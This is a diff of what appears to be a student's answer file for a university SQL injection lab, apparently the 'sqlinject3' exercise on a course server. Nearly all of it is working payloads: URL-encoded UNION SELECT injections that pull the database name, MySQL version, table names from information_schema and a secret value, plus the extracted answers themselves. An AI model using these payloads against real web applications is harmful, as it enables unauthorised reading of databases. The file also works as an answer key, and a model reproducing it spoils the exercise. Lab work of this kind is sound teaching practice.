@@ -1,30 +1,9 @@
-db_name: proj2_inject3
-db_version: 5.5.59-0ubuntu0.14.04.1
-table_names: 
-secret_string: 
+proj2_inject3
+5.5.59-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+scapula
 
-url_1: http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+database%28%29%2C+1%2C+1+%23
-url_2: http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+version%28%29%2C+1%2C+1%3B+%23
-url_3: 
-url_4: 
-
-
-
-e917d918fc634fe3214fbbf603ddfa19
-
-' UNION SELECT e917d918fc634fe3214fbbf603ddfa19 FROM sqlinject3_users; #
-
-
-
-
-
-
-
-
-2%27+union+select+all+%271%27%2Cdatabase%28%29%2C%27%26%27+order+by+1%3B%23
-
-2%27+union+select+all+%271%27%2Cversion%28%29%2C%27%26%27+order+by+1%3B%23
-
-1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28table_name+SEPARATOR+%27+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27+order+by+1%23%28will+get+SECRETTABLE+foo+inject3_users%29
-
-1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28secret+SEPARATOR+%27+%27%29+from+SECRETTABLE+order+by+1%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+database%28%29%2C+1%2C+1+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C+version%28%29%2C+1%2C+1%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2C1%2C1%2C+MID%28GROUP_CONCAT%28table_name%29%2C+550%2C+100%29+FROM+information_schema.tables%3B+%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+1%2Cid%2C1%2Csecret+FROM+SECRET+WHERE+hash%3D%27e917d918fc634fe3214fbbf603ddfa19%27%3B+%23
